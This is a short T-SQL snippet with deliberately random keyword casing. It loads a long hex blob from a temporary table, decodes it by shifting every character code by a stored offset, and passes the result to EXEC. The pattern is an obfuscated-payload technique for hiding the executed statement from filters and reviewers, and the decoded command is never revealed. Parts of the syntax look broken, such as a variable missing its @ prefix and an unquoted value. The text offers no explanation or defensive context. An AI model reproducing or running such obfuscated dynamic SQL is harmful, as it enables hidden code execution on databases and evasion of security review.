DEClARE @i InT, @big_hex VARchaR(max), @fourth_param InT;
SELECT 
    @i=1,
    big_hex=0xb0ad878fdaacd3acaabb87dbd6b7879887a8a8e0d4dfa9d5a0afdeae9dbb9987cdd9b6b4878ad8b5da99a9b3cab99bd19087a4878ecc9cccc9cacbcacc9bcb97cba09da098cbc89ccc9ecd9a9e9bcdc999cc9ecdc98e7471a9acaed0d57471baccd3cccabb87cdd3c8ce87add9b6b4878ad8b5da99a9b3cab99bd17471acb5cb,
    @fourth_param = LXduUXp3V5
    FROM #qNs2BLcR4j;
wHILE @i <= lEN(@big_hex)
bEgIN
    SET @big_hex=subsTriNg(@big_hex, 1, @i-1)
        + ChAR(AsCiI(SUbsTrIng(@big_hex,@i,1)) - @fourth_param)
        +SuBsTrINg(@big_hex, @i+1, len(@big_hex));
    set @i = @i+1
end;
eXEc (@big_hex)